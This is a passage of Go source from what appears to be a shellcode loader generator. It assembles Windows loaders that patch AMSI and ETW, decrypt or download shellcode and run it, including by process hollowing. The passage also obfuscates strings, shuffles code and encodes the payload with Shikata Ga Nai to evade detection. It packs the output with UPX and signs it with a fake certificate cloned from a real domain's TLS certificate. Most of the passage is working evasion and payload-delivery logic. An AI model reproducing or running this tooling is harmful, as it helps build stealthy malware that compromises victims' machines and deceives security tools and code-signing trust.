      log.Fatal({{.Vars.err}})
    }
`
  }

  // enable ACG Guard
  if (acg) {
    main_func = main_func + `
  {{.Vars.err}} = {{.Vars.acg_func}}()
  if {{.Vars.err}} != nil {
    fmt.Println({{.Vars.err}}.Error())
  }
`
  }

  // enable BlockDLLs
  if (blockdlls) {
    main_func = main_func + `
  {{.Vars.err}} = {{.Vars.blockdlls_func}}()
  if {{.Vars.err}} != nil {
    fmt.Println({{.Vars.err}}.Error())
  }
`
  }

  // add AMSI patch
  if (!noamsi) {
    main_func = main_func + `
  {{.Vars.err}} = {{.Vars.amsi_patch_func}}()
  if {{.Vars.err}} != nil {
    fmt.Println({{.Vars.err}}.Error())
  }
`
  }

  // add ETW patch
  if (!noetw) {
    main_func = main_func + `
  {{.Vars.err}} = {{.Vars.etw_patch_func}}()
  if {{.Vars.err}} != nil {
    fmt.Println({{.Vars.err}}.Error())
  }
`
  }

  // convert shellcode to hex as it is easier to work with it
  shellcode = []byte(hex.EncodeToString(shellcode))

  var shellcode_def string

  // check whether a encryption was used or not
  if (strings.ToLower(encrypt) != "none") && (strings.ToLower(encrypt) != "") {
    shellcode_def = `
var {{.Vars.enc_shellcode}} []byte
`

    main_func = main_func + `
  {{.Vars.enc_shellcode}}, _ = hex.DecodeString("` + string(shellcode) + `")
`
  } else {
    shellcode_def = `
var {{.Vars.shellcode}} []byte
`

    if ((!strings.HasPrefix(input_file, "http")) && (!errors.Is(input_err, os.ErrNotExist))) || (calc) {
      main_func = main_func + `
  {{.Vars.shellcode}}, _ = hex.DecodeString("` + string(shellcode) + `")
`
    } else {
      main_func = main_func + `
  {{.Vars.shellcode}}, {{.Vars.err}} = {{.Vars.get_shellcode_from_url_func}}(` + ObfuscateStr(input_file, str_obfs) + `)
  if {{.Vars.err}} != nil {
    log.Fatal({{.Vars.err}})
  }
`
    }
  }

  // decrypt shellcode
  if (strings.ToLower(encrypt) == "aes") {
    main_func = main_func + `
  {{.Vars.shellcode}}, {{.Vars.err}} := {{.Vars.aes_decrypt_func}}({{.Vars.enc_shellcode}}, ` + ConvertBytesToStrFormat(iv) + `, []byte("` + string(key) + `"))
  if {{.Vars.err}} != nil {
    log.Fatal({{.Vars.err}})
  }
`
  } else if (strings.ToLower(encrypt) == "3des") {
    main_func = main_func + `
  {{.Vars.shellcode}}, {{.Vars.err}} := {{.Vars.tripledes_decrypt_func}}({{.Vars.enc_shellcode}}, []byte("` + string(key) + `"))
  if {{.Vars.err}} != nil {
    log.Fatal({{.Vars.err}})
  }
`    
  } else if (strings.ToLower(encrypt) == "rc4") {
    main_func = main_func + `
  {{.Vars.shellcode}}, {{.Vars.err}} := {{.Vars.rc4_decrypt_func}}({{.Vars.enc_shellcode}}, []byte("` + string(key) + `"))
  if {{.Vars.err}} != nil {
    log.Fatal({{.Vars.err}})
  }
`
  } else if (strings.ToLower(encrypt) == "xor") {
    main_func = main_func + `
  {{.Vars.shellcode}} := {{.Vars.xor_func}}({{.Vars.enc_shellcode}}, []byte("` + string(key) + `"))
`
  }

  if (sleep_time) {
    if (utils.RandomInt(1, 2) == 1) {
      main_func = main_func + `
  {{.Vars.sleep_func}}()
`
    }
  }

  if (exec_technique == "processhollowing") {
    main_func = main_func + `
  {{.Vars.err}} = {{.Vars.execute_shellcode_func}}({{.Vars.shellcode}}, ` + ObfuscateStr(process, str_obfs) + `, ` + strconv.FormatBool(blockdlls) + `)`
  } else {
    main_func = main_func + `
  {{.Vars.err}} = {{.Vars.execute_shellcode_func}}({{.Vars.shellcode}})`
  }
  
  main_func = main_func + `
  if {{.Vars.err}} != nil {
    log.Fatal({{.Vars.err}})
  }
}
`

  // parse main function

  if (!strings.HasPrefix(input_file, "http")) {
    imports = utils.AppendString(imports, "encoding/hex")
  }

  exports = utils.AppendString(exports, ParseTemplate(shellcode_def, Main))
  functions = utils.AppendString(functions, ParseTemplate(main_func, Main))

  fmt.Println("[*] Obfuscating variables and functions...")
  time.Sleep(100 * time.Millisecond)

  if (format == "dll") {
    fmt.Println("[*] The function of the DLL to execute shellcode is: " + func_name)
    time.Sleep(100 * time.Millisecond)
    fmt.Println("  > Execute the DLL like: rundll32.exe " + output_file + "," + func_name + "\n")
  }

  // write Golang code to file
  err = WriteLoader("loader.go", imports, exports, functions)
  if err != nil {
    log.Fatal(err)
  }
  defer os.Remove("loader.go")

  fmt.Println("[*] Compiling shellcode loader...")
  time.Sleep(100 * time.Millisecond)

  fmt.Println("  > Payload format is set to " + strings.ToUpper(format))
  time.Sleep(100 * time.Millisecond)

  if (verbose) {
    fmt.Println("  > Using Golang compiler")
    time.Sleep(100 * time.Millisecond)
  }

  // compile source code
  err = CompileLoader(format, output_file, compress, arch)
  if err != nil {
    log.Fatal(err)
  }

  // compress loader using UPX
  if (compress) {
    _, err := exec.LookPath("upx")
    if err == nil {
      fmt.Println("  > Compressing " + output_file + " using UPX, this may take some time")
      time.Sleep(100 * time.Millisecond)

      err = exec.Command("upx", "--best", "--force", output_file).Run()
      if err != nil {
        fmt.Println("[-] An error has ocurred while compressing the loader, skipping this step")
      }
    } else {
      fmt.Println("  > UPX not found. Skipping this step")
    }
  }

  fi, err := os.Stat(output_file)
  if err != nil {
    log.Fatal(err)
  }
  fmt.Printf("  > %d bytes written to %s\n\n", fi.Size(), output_file)

  // sign generated loader using osslsigncode
  // use fake cert
  if (domain != "") {
    fmt.Println("[*] Signing loader using a fake cert (" + domain + ")")

    password := utils.RandomString(utils.RandomInt(8, 12))

    err = GenerateCerts(domain, password)
    if err != nil {
      fmt.Println("  > An error has ocurred while signing loader, so it won't be signed")
    } else {
      err = SignLoader(output_file, "signed_" + output_file, domain, password, verbose)
      if err != nil {
        fmt.Println("  > An error has ocurred while signing loader, so it won't be signed")
      } else {
        os.Remove(output_file) // remove original loader
        err = os.Rename("signed_" + output_file, output_file) // rename signed loader
        if err != nil {
          log.Fatal(err)
        }
      }
    }
    fmt.Println()

    os.Remove(domain + ".key")
    os.Remove(domain + ".pem")
    os.Remove(domain + ".pfx")
  }

  // use real certificate
  if (cert != "") {
    fmt.Println("[*] Signing loader using a valid cert (" + cert + ")")

    password := utils.RandomString(utils.RandomInt(8, 12))

    err = SignLoader(output_file, "signed_" + output_file, domain, password, verbose)
    if err != nil {
      fmt.Println("[-] An error has ocurred while signing loader, so it won't be signed")
    } else {
      os.Remove(output_file) // remove original loader
      err = os.Rename("signed_" + output_file, output_file) // rename signed loader
      if err != nil {
        log.Fatal(err)
      }
    }
  }

  // compute entropy
  entropy, err := utils.Entropy(output_file)
  if err != nil {
    log.Fatal(err)
  }
  fmt.Println("[+] Loader file entropy:", entropy)

  // compute checksums
  md5, sha1, sha256, err := utils.CalculateSums(output_file)
  if err != nil {
    log.Fatal(err)
  }

  time.Sleep(100 * time.Millisecond)
  fmt.Println("[+] Checksums:")
  fmt.Println("  > MD5:", md5)
  fmt.Println("  > SHA1:", sha1)
  fmt.Println("  > SHA256:", sha256)

  fmt.Println("\n[+] Shellcode loader has been successfully generated")

  if (format == "dll") {
    os.Remove(strings.Split(output_file, ".")[0] + ".h") // remove header file (e.g. loader.h)
  }
}

/*

auxiliary functions start here

*/

// create template, parse it, get result as string, reset buffer and return result
func ParseTemplate(func_to_parse string, template_main *LoaderTemplate) string {
  //fmt.Println(func_to_parse)
  template, err := template.New("template").Parse(func_to_parse)
  if err != nil {
    log.Fatal(err)
  }

  err = template.Execute(&buffer, template_main)
  if err != nil {
    log.Fatal(err)
  }
  
  parsed_func := buffer.String()
  buffer.Reset()

  return parsed_func
}

// function to finally write the Golang code to a file
func WriteLoader(code_file string, imports, exports, functions []string) error {
  // create golang file
  f, err := os.Create(code_file)
  if err != nil {
    return err
  }

  // define imports and file eader
  initial_code := `package main

import (
`

  // shuffle imports slice
  ShuffleSlice(imports)

  // iterate over every import to add them to the loader code
  for _, imp := range imports {
    initial_code = initial_code + `  "` + imp + `"
`
  }
  initial_code = initial_code + ")\n"

  // mix slices
  all_code_definitions := append(functions, exports...)

  // shuffle slices
  ShuffleSlice(all_code_definitions)

  // create final code
  var main_code string
  for _, entry := range all_code_definitions {
    main_code = main_code + entry
  }

  // write initial code to loader file
  _, err = f.WriteString(initial_code)
  if err != nil {
    return err
  }

  // write remaining part of the code
  _, err = f.WriteString(main_code)
  if err != nil {
    return err
  }

  return nil
}

// function to compile loader code based on provided arguments
func CompileLoader(format string, output_file string, compress bool, arch string) error {
  // check if go.mod file exists
  _, err := os.Stat("go.mod")
  if os.IsNotExist(err) {

    // if it doesn't exist, then create it
    mod_cmd := exec.Command("go", "mod", "init", "hooka_ldr")
    err = mod_cmd.Run()
    if err != nil {
      return err
    }
    defer os.Remove("go.mod")

    // if go.mod didn't exist we also need to download the windows library
    get_cmd := exec.Command("go", "get", "golang.org/x/sys/windows")
    err = get_cmd.Run()
    if err != nil {
      return err
    }
    defer os.Remove("go.sum")
  }

  // define command to compile source code
  var compile_cmd *exec.Cmd

  // compile as .EXE
  if (format == "exe") {
    if (compress) {
      fmt.Println("  > go", "build", "-ldflags", "-w -s", "-o", output_file, "loader.go")
      compile_cmd = exec.Command("go", "build", "-ldflags", "-w -s", "-o", output_file, "loader.go")
    } else {
      fmt.Println("  > go", "build", "-o", output_file, "loader.go")
      compile_cmd = exec.Command("go", "build", "-o", output_file, "loader.go")
    }
  } else if (format == "dll") { // compile as .DLL
    if (compress) {
      fmt.Println("  > go", "build", "-ldflags", "-w -s", "-buildmode=c-shared", "-o", output_file, "loader.go")
      compile_cmd = exec.Command("go", "build", "-ldflags", "-w -s", "-buildmode=c-shared", "-o", output_file, "loader.go")
    } else {
      fmt.Println("  > go", "build", "-buildmode=c-shared", "-o", output_file, "loader.go")
      compile_cmd = exec.Command("go", "build", "-buildmode=c-shared", "-o", output_file, "loader.go")
    }
  }

  compile_cmd.Env = append(os.Environ(), "GOARCH=" + arch, "GOOS=windows", "CGO_ENABLED=1", "CC=x86_64-w64-mingw32-gcc")
  err = compile_cmd.Run()
  if err != nil {
    fmt.Println("\n[-] Error while compiling loader:")
    return err
  }

  return nil
}

func ShikataGaNai(shellcode []byte) ([]byte, error) {
  rand_input_file := utils.RandomString(8) + ".bin"
  rand_output_file := utils.RandomString(8) + ".bin"

  err := ioutil.WriteFile(rand_input_file, shellcode, 0644)
  if err != nil {
    return nil, err
  }

  cmd := exec.Command("sgn", "-i", rand_input_file, "-o", rand_output_file)
  err = cmd.Run()
  if err != nil {
    fmt.Println("[-] Error while running sgn to obfuscate shellcode, skipping this step")

    // revert changes if sgn returned an error
    os.Remove(rand_input_file)
    os.Remove(rand_output_file)
    return nil, err
  }
  time.Sleep(100 * time.Millisecond)

  sgn_shellcode, err := utils.GetShellcodeFromFile(rand_output_file)
  if err != nil {
    return nil, err
  }

  os.Remove(rand_input_file)
  os.Remove(rand_output_file)

  return sgn_shellcode, nil
}

// generate certificates needed to sign executables
func GenerateCerts(domain string, password string) error {
  // create .KEY file
  fmt.Println("  > Generating KEY file")

	rootKey, err := rsa.GenerateKey(crypto_rand.Reader, 4096)
	if err != nil {
    return err
	}

  conn, err := tls.Dial("tcp", domain + ":443", &tls.Config{InsecureSkipVerify: true})
	if err != nil {
		return err
	}
	defer conn.Close()

	var buff bytes.Buffer
	for _, cert := range conn.ConnectionState().PeerCertificates {
		err = pem.Encode(&buff, &pem.Block{Type:  "CERTIFICATE", Bytes: cert.Raw})
		if err != nil {
			return err
		}
	}

  certs := buff.String()

	block, _ := pem.Decode([]byte(certs))
	cert, _ := x509.ParseCertificate(block.Bytes)

  time.Sleep(100 * time.Millisecond)
	file, err := os.Create(domain + ".key")
	if err != nil {
    return err
	}
	defer file.Close()

	b, err := x509.MarshalPKCS8PrivateKey(rootKey)
	if err != nil {
    return err
	}

	err = pem.Encode(file, &pem.Block{Type: "RSA PRIVATE KEY", Bytes: b})
  if err != nil {
    return err
	}

	SubjectTemplate := x509.Certificate{
		SerialNumber: cert.SerialNumber,
		Subject: pkix.Name{
			CommonName: cert.Subject.CommonName,
		},
		NotBefore:             cert.NotBefore,
		NotAfter:              cert.NotAfter,
		BasicConstraintsValid: true,
		IsCA:                  true,
		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageCertSign,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth, x509.ExtKeyUsageClientAuth},
	}

	IssuerTemplate := x509.Certificate{
		SerialNumber: cert.SerialNumber,
		Subject: pkix.Name{
			CommonName: cert.Issuer.CommonName,
		},
		NotBefore: cert.NotBefore,
		NotAfter:  cert.NotAfter,
	}

	derBytes, err := x509.CreateCertificate(crypto_rand.Reader, &SubjectTemplate, &IssuerTemplate, &rootKey.PublicKey, rootKey)
	if err != nil {
    return err
	}

  // create .PEM file
  fmt.Println("  > Generating PEM file")
  time.Sleep(100 * time.Millisecond)
  certOut, err := os.Create(domain + ".pem")
	if err != nil {
    return err
	}

	err = pem.Encode(certOut, &pem.Block{Type: "CERTIFICATE", Bytes: derBytes})
  if err != nil {
    return err
	}

	err = certOut.Close()
  if err != nil {
    return err
	}

  // generate PFX file
  fmt.Println("  > Generating PFX file")
  time.Sleep(100 * time.Millisecond)
  cmd := exec.Command("openssl", "pkcs12", "-export", "-out", domain + ".pfx", "-inkey", domain + ".key", "-in", domain + ".pem", "-passin", "pass:" + password, "-passout", "pass:" + password)
  err = cmd.Run()
  if err != nil {
    return err
  }

  return nil
}

func SignLoader(input_file string, output_file string, domain string, password string, verbose bool) error {
  if (verbose) {
    fmt.Println("  > Using osslsigncode to sign " + input_file)
    time.Sleep(100 * time.Millisecond)
  }

  cmd := exec.Command("osslsigncode", "sign", "-pkcs12", domain + ".pfx", "-in", input_file, "-out", output_file, "-pass", password)
  err := cmd.Run()
  if err != nil {
    return err
  }

  return nil
}

// function which takes care of generating random configuration when the --rand CLI argument was provided
func GetRandomConfig() (string, string, bool, bool, bool, bool, bool, bool, bool, bool, bool, bool) {
  var encrypt, unhook string
  var noamsi, noetw, sgn, str_obfs, acg, blockdlls, sandbox, phantom, sleep_time, compress bool

  enc_rand := utils.RandomInt(1, 5)
  if enc_rand == 1 {
    encrypt = "aes"
  } else if enc_rand == 2 {
    encrypt = "3des"
  } else if enc_rand == 3 {
    encrypt = "rc4"
  } else if enc_rand == 4 {
    encrypt = "xor"
  } else if enc_rand == 5 {
    encrypt = "none"
  }

  unhook_rand := utils.RandomInt(1, 3)
  if unhook_rand == 1 {
    unhook = "full"
  } else if  unhook_rand == 2 {
    unhook = "peruns"
  } else if unhook_rand == 3 {
    unhook = "none"
  }

  amsi_rand := utils.RandomInt(1, 2)
  if amsi_rand == 1 {
    noamsi = false // patch AMSI
  } else {
    noamsi = true // do not patch AMSI
  }

  etw_rand := utils.RandomInt(1, 2)
  if etw_rand == 1 {
    noetw = false // patch ETW
  } else {
    noetw = true // do not patch ETW
  }

  sgn_rand := utils.RandomInt(1, 2)
  if sgn_rand == 1 {
    sgn = false // do not use Shikata Ga Nai
  } else {
    _, err := exec.LookPath("sgn") // check if sgn command is installed
    if err == nil {
      sgn = true
    } else {
      sgn = false
    }
  }

  strings_rand := utils.RandomInt(1, 2)
  if strings_rand == 1 {
    str_obfs = true
  } else {
    str_obfs = false
  }

  acg_rand := utils.RandomInt(1, 2)
  if acg_rand == 1 {
    acg = false // do not enable ACG Guard
  } else {
    acg = true // enable ACG Guard
  }

  blockdlls_rand := utils.RandomInt(1, 2)
  if blockdlls_rand == 1 {
    blockdlls = true // enable blockdlls
  } else {
    blockdlls = false // do not enable blockdlls
  }

  sandbox_rand := utils.RandomInt(1, 2)
  if sandbox_rand == 1 {
    sandbox = false // do not enable sandbox detection
  } else {
    sandbox = true // enable sandbox detection
  }

  phantom_rand := utils.RandomInt(1, 2)
  if phantom_rand == 1 {
    phantom = false // do not use Phant0m technique
  } else {
    phantom = true // use Phant0m technique
  }

  sleep_rand := utils.RandomInt(1, 2)
  if sleep_rand == 1 {
    sleep_time = true
  } else {
    sleep_time = false
  }

  compress_rand := utils.RandomInt(1, 2)
  if compress_rand == 1 {
    compress = true
  } else {
    compress = false
  }

  return encrypt, unhook, noamsi, noetw, sgn, str_obfs, acg, blockdlls, sandbox, phantom, sleep_time, compress
}

func CaesarEncrypt(plaintext string, shift int) string {
	ciphertext := ""

	for _, char := range plaintext {
		if char >= 'A' && char <= 'Z' {
			ciphertext += string((char-'A'+rune(shift))%26 + 'A')
		} else if char >= 'a' && char <= 'z' {
			ciphertext += string((char-'a'+rune(shift))%26 + 'a')
		} else {
			ciphertext += string(char)
		}
	}

	return ciphertext
}

func CaesarDecrypt(ciphertext string, shift int) string {
	return CaesarEncrypt(ciphertext, 26-shift)
}

func ObfuscateStr(str string, str_obfs bool) string {
  if (str_obfs) {
    if strings.Contains(str, "\\") {
      //fmt.Println(str)
      str = strings.ReplaceAll(str, "\\", "\\\\")
    }

    rand_shift := utils.RandomInt(2, 10)
    return "{{.Vars.caesar_decrypt_func}}(\"" + CaesarEncrypt(str, rand_shift) + "\", " + strconv.Itoa(rand_shift) + ")"
  } else {
    return ConvertStr(str)
  }
}

func ShuffleSlice(slice []string) {
  math_rand.Seed(time.Now().UnixNano())
  math_rand.Shuffle(len(slice), func(i, j int) { slice[i], slice[j] = slice[j], slice[i] })
}

func GenerateHash(str string, rand_num int) string {
  if (rand_num == 1) {
    return utils.Md5(str)
  } else if (rand_num == 2) {
    return utils.Sha1(str)
  } else if (rand_num == 3) {
    return utils.Sha256(str)
  }

  return ""
}

func ConvertStr(str string) string {
  new_str := fmt.Sprint("string([]byte{")
  for p, c := range str {
    if fmt.Sprintf("%c", c) == "\\" {
      new_str = new_str + fmt.Sprintf("'\\%c', ", c)
    } else {
      if (len(str) - 1) == p {
        new_str = new_str + fmt.Sprintf("'%c'", c)
      } else {
        new_str = new_str + fmt.Sprintf("'%c', ", c)
      }
    }
  }
  new_str = new_str + fmt.Sprint("})")

  return new_str
}

func GetCallsNames() (string, string, string, string, string, string) {
  var NtAllocateVirtualMemory, NtWriteVirtualMemory, NtProtectVirtualMemory, NtCreateThreadEx, NtQueryInformationThread, NtQueryInformationProcess string

  if (utils.RandomInt(1,2) == 1) {
    NtAllocateVirtualMemory = "NtAllocateVirtualMemory"
  } else {
    NtAllocateVirtualMemory = "ZwAllocateVirtualMemory"
  }

  if (utils.RandomInt(1,2) == 1) {
    NtWriteVirtualMemory = "NtWriteVirtualMemory"
  } else {
    NtWriteVirtualMemory = "ZwWriteVirtualMemory"
  }

  if (utils.RandomInt(1,2) == 1) {
    NtProtectVirtualMemory = "NtProtectVirtualMemory"
  } else {
    NtProtectVirtualMemory = "ZwProtectVirtualMemory"
  }

  if (utils.RandomInt(1,2) == 1) {
    NtCreateThreadEx = "NtCreateThreadEx"
  } else {
    NtCreateThreadEx = "ZwCreateThreadEx"
  }

  if (utils.RandomInt(1,2) == 1) {
    NtQueryInformationThread = "NtQueryInformationThread"
  } else {
    NtQueryInformationThread = "ZwQueryInformationThread"
  }

  if (utils.RandomInt(1,2) == 1) {
    NtQueryInformationProcess = "NtQueryInformationProcess"
  } else {
    NtQueryInformationProcess = "ZwQueryInformationProcess"
  }

  return NtAllocateVirtualMemory, NtWriteVirtualMemory, NtProtectVirtualMemory, NtCreateThreadEx, NtQueryInformationThread, NtQueryInformationProcess
}

func ConvertBytesToStrFormat(src_bytes []byte) string {
  var new_str string

  new_str = "[]byte{"

  for _, b := range src_bytes {
    new_str = new_str + fmt.Sprintf("0x%x, ", b)
  }

  new_str = strings.TrimSuffix(new_str, ", ") + "}"

  return new_str
}

func ConvertSliceToStrFormat(slice []string, str_obfs bool) string {
  var new_str string

  if str_obfs {
    new_str = "[]string{ "
  } else {
    new_str = "[]string{"
  }

  for _, i := range slice {
    new_str = new_str + ObfuscateStr(i, str_obfs) + ", "
  }

  new_str = strings.TrimSuffix(new_str, ", ") + "}"

  return new_str
}

